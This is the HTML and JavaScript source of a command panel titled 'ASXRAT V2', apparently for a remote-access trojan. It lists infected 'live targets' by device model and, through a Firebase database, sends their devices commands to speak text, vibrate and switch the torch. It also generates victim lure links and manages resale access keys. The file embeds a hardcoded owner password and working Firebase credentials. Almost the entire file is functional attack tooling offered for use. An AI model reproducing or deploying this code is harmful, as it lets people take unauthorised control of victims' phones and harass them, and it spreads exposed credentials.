<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ASXRAT V2 CONTROL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #ffd700; --bg: #050505; --card: #111; }
        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
        #auth { position: fixed; inset: 0; background: #000; z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .card { border: 1px solid var(--neon); padding: 20px; border-radius: 12px; background: var(--card); width: 85%; max-width: 400px; text-align: center; box-shadow: 0 0 10px var(--neon); }
        input, select { width: 90%; padding: 10px; margin: 8px 0; background: #1a1a1a; border: 1px solid #444; color: var(--neon); border-radius: 5px; text-align: center; outline: none; }
        #dash { display: none; padding: 15px; }
        .target-card { background: var(--card); border: 1px solid #333; padding: 12px; margin-bottom: 15px; border-radius: 10px; border-left: 4px solid var(--neon); }
        .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 5px; margin-top: 10px; }
        .btn-rat { background: #222; color: #fff; border: 1px solid var(--neon); padding: 8px; font-size: 10px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .btn-main { background: var(--neon); color: #000; border: none; padding: 12px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; }
    </style>
</head>
<body>

    <div id="auth">
        <div class="card">
            <h2 style="color:var(--neon)">ASXRAT V2</h2>
            <input type="password" id="key-input" placeholder="ACCESS KEY...">
            <button onclick="login()" class="btn-main">LOGIN</button>
        </div>
    </div>

    <div id="dash">
        <div class="card" style="width:100%; max-width:100%; margin-bottom:15px; box-sizing:border-box;">
            <b id="user-display" style="color:var(--neon)">USER: ...</b> <br>
            <button class="btn-main" onclick="salinLink()" style="margin-top:10px;">📋 COPY MY TARGET LINK</button>
            
            <div id="owner-tools" style="display:none; margin-top:15px; border-top:1px solid #333; padding-top:10px;">
                <b style="color:#00ff00">MANAGE KEYS</b>
                <input type="text" id="new-key" placeholder="NAMA KEY...">
                <select id="role-select">
                    <option value="USER">ROLE: USER</option>
                    <option value="RESELLER" id="opt-res">ROLE: OWNER</option>
                </select>
                <button onclick="buatKey()" style="background:#00ff00; width:100%; border:none; padding:10px; border-radius:5px; font-weight:bold;">CREATE KEY</button>
            </div>
        </div>

        <h4 style="color:var(--neon)">📡 LIVE TARGETS:</h4>
        <div id="list"></div>
    </div>

<script>
    const linkWebTarget = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html"; // GANTI PAKE LINK TARGET LU

    const firebaseConfig = {
      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
      authDomain: "rat-html.firebaseapp.com",
      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "rat-html",
      storageBucket: "rat-html.firebasestorage.app",
      messagingSenderId: "1060124583265",
      appId: "1:1060124583265:web:a117830e798cd1d60f5120",
      measurementId: "G-XMHT2S731L"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let myKey = ""; let myRole = "USER";

    function login() {
        const val = document.getElementById('key-input').value;
        if(val === "elvoxi122") {
            myKey = "PEMILKK"; myRole = "PEMILIK";
            document.getElementById('owner-tools').style.display = 'block';
            start();
        } else {
            db.ref('mario/all_keys/' + val).once('value', (s) => {
                if(s.exists()) {
                    myKey = val; myRole = s.val().role || "USER";
                    if(myRole === "OWNER") document.getElementById('owner-tools').style.display = 'block';
                    start();
                } else alert("KEY SALAH!");
            });
        }
    }

    function start() {
        document.getElementById('auth').style.display = 'none';
        document.getElementById('dash').style.display = 'block';
        document.getElementById('user-display').innerText = `USER: ${myKey} (${myRole})`;
        
        db.ref('mario/targets').on('value', (snap) => {
            const container = document.getElementById('list');
            container.innerHTML = "";
            snap.forEach((child) => {
                const d = child.val();
                if(myRole === "PEMILIK" || d.belongsTo === myKey) {
                    container.innerHTML += `
                        <div class="target-card">
                            <b style="color:var(--neon)">${d.model}</b> <br>
                            <input type="text" id="tts-${child.key}" placeholder="Teks suara ke target..." style="width:100%; margin-top:5px; text-align:left;">
                            <div class="btn-grid">
                                <button class="btn-rat" onclick="sendTTS('${child.key}')">🗣️ SUARA</button>
                                <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">📳 GETAR</button>
                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">🔦 SENTER ON</button>
                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_off')">OFF</button>
                            </div>
                        </div>`;
                }
            });
        });
    }

    function cmd(id, act) { db.ref(`mario/commands/${id}`).set({ action: act, time: Date.now() }); }
    
    function sendTTS(id) {
        const txt = document.getElementById('tts-' + id).value;
        if(!txt) return alert("Isi teks!");
        db.ref(`mario/commands/${id}`).set({ action: 'speak_text', text: txt, time: Date.now() });
    }

    function buatKey() {
        const n = document.getElementById('new-key').value;
        const r = document.getElementById('role-select').value;
        if(!n) return;
        db.ref('mario/all_keys/' + n).set({ role: r, createdBy: myKey });
        alert("Key Berhasil Dibuat!");
    }

    function salinLink() {
        navigator.clipboard.writeText(`${linkWebTarget}?key=${myKey}`);
        alert("Link Target Disalin!");
    }
</script>
</body>
</html>
